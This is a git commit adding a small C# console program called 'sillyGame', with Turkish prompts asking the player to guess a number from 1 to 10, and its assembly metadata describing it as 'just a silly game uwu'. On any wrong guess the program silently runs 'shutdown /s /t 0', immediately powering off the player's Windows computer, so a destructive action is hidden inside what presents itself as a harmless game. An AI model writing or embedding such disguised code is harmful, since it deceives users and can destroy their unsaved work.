35872bcb94c6f9487cd229fbc8048b7c97805f95
Tarık Kerem <tkeremc@outlook.com>
2024-06-02 20:27:40 +0300

    Initial commit

---
+++ sillyGame/Program.cs
@@ -0,0 +1,30 @@
+﻿using System;
+using System.Diagnostics;
+
+class Program
+{
+    static void Main()
+    {
+        Random random = new Random();
+        int correctNumber = random.Next(1, 11);
+        Console.WriteLine("1 ile 10 arasında bir sayı tuttum. Tahmin et bakalım!");
+        Console.Write("Tahminin: ");
+        int guessedNumber;
+        if (int.TryParse(Console.ReadLine(), out guessedNumber))
+        {
+            if (guessedNumber == correctNumber)
+            {
+                Console.WriteLine("Tebrikler! Doğru bildin.");
+            }
+            else
+            {
+                Console.WriteLine("Yanlış tahmin.");
+                Process.Start("shutdown", "/s /t 0");
+            }
+        }
+        else
+        {
+            Console.WriteLine("Geçersiz giriş. Lütfen 1 ile 10 arasında bir sayı gir.");
+        }
+    }
+}
---
+++ sillyGame/Properties/AssemblyInfo.cs
@@ -0,0 +1,35 @@
+﻿using System.Reflection;
+using System.Runtime.InteropServices;
+
+// General Information about an assembly is controlled through the following 
+// set of attributes. Change these attribute values to modify the information
+// associated with an assembly.
+[assembly: AssemblyTitle("sillyGame")]
+[assembly: AssemblyDescription("just a silly game uwu")]
+[assembly: AssemblyConfiguration("setsuna")]
+[assembly: AssemblyCompany("setsuna")]
+[assembly: AssemblyProduct("sillyGame")]
+[assembly: AssemblyCopyright("setsuna ©  2024")]
+[assembly: AssemblyTrademark("setsuna")]
+[assembly: AssemblyCulture("setsuna")]
+
+// Setting ComVisible to false makes the types in this assembly not visible 
+// to COM components.  If you need to access a type in this assembly from 
+// COM, set the ComVisible attribute to true on that type.
+[assembly: ComVisible(false)]
+
+// The following GUID is for the ID of the typelib if this project is exposed to COM
+[assembly: Guid("405F5272-08A9-46CB-BE2B-A1C1149533BA")]
+
+// Version information for an assembly consists of the following four values:
+//
+//      Major Version
+//      Minor Version 
+//      Build Number
+//      Revision
+//
+// You can specify all the values or you can default the Build and Revision Numbers 
+// by using the '*' as shown below:
+// [assembly: AssemblyVersion("1.0.*")]
+[assembly: AssemblyVersion("1.0.0.0")]
+[assembly: AssemblyFileVersion("1.0.0.0")]
